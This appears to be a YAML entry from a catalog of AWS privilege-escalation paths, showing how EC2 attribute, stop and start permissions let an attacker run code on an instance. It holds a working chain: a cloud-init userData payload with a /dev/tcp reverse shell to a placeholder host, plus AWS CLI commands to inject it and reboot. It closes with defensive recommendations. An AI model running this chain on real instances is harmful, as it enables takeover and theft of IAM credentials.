id: ec2-002
name: ec2:ModifyInstanceAttribute + ec2:StopInstances + ec2:StartInstances
category: access-resource
services:
- ec2
description: An attacker with the permissions to modify an EC2 instance's attributes, stop it, and start it can gain full
  control over the instance. The `ec2:ModifyInstanceAttribute` permission can be used to change an instance's userData, which
  is a script that normally runs on the initial boot. However with a specially crafted payload, a modified userData script
  can be coerced to run on subsequent restarts. To modify the userData of a running instance, it must first be stopped. The
  attacker can inject a malicious script (e.g., for a reverse shell) into the userData, and then start the instance to trigger
  its execution. This provides the attacker with code execution on the machine, allowing them to steal the credentials of
  any attached IAM role.
prerequisites:
  admin:
  - EC2 instance must have an instance profile attached to an IAM role
  - Target EC2 instance must have a role with administrative permissions attached
  lateral:
  - EC2 instance must have an instance profile attached to an IAM role
exploitationSteps:
  awscli:
  - step: 1
    command: |
      # Create malicious user data with cloud-init configuration
      TEXT='Content-Type: multipart/mixed; boundary="//"
      MIME-Version: 1.0

      --//
      Content-Type: text/cloud-config; charset="us-ascii"
      MIME-Version: 1.0
      Content-Transfer-Encoding: 7bit
      Content-Disposition: attachment; filename="cloud-config.txt"

      #cloud-config
      cloud_final_modules:
      - [scripts-user, always]

      --//
      Content-Type: text/x-shellscript; charset="us-ascii"
      MIME-Version: 1.0
      Content-Transfer-Encoding: 7bit
      Content-Disposition: attachment; filename="userdata.txt"

      #!/bin/bash
      bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1
      --//'
      TEXT_PATH="/tmp/text.b64.txt"
      printf "%s" "$TEXT" | base64 > "$TEXT_PATH"
    description: Create base64-encoded malicious user data with reverse shell payload
  - step: 2
    command: aws ec2 stop-instances --instance-ids $INSTANCE_ID
    description: Stop the target EC2 instance
  - step: 3
    command: aws ec2 modify-instance-attribute --instance-id "$INSTANCE_ID" --attribute userData --value "file://$TEXT_PATH"
    description: Modify the user data with the malicious script
  - step: 4
    command: aws ec2 start-instances --instance-ids $INSTANCE_ID
    description: Start the instance to trigger execution of the malicious user data
recommendation: |
  The combination of `ec2:ModifyInstanceAttribute`, `ec2:StopInstances`, and `ec2:StartInstances`
  is highly sensitive. IAM policies should avoid granting these permissions together,
  especially with wildcard resources. If necessary, use the Resource element in IAM policies
  to strictly limit these actions to a specific, intended set of instances. Monitor CloudTrail
  logs for this sequence of API calls.
discoveredBy:
  name: Unknown
  organization: Unknown
references:
- title: Bishop Fox Blog - Privilege Escalation in AWS
  url: https://bishopfox.com/blog/privilege-escalation-in-aws
toolSupport:
  pmapper: false
  iamVulnerable: false
permissions:
  required:
  - permission: ec2:ModifyInstanceAttribute
    resourceConstraints: Target EC2 instance must be in the Resource section
  - permission: ec2:StopInstances
    resourceConstraints: Target EC2 instance must be in the Resource section
  - permission: ec2:StartInstances
    resourceConstraints: Target EC2 instance must be in the Resource section
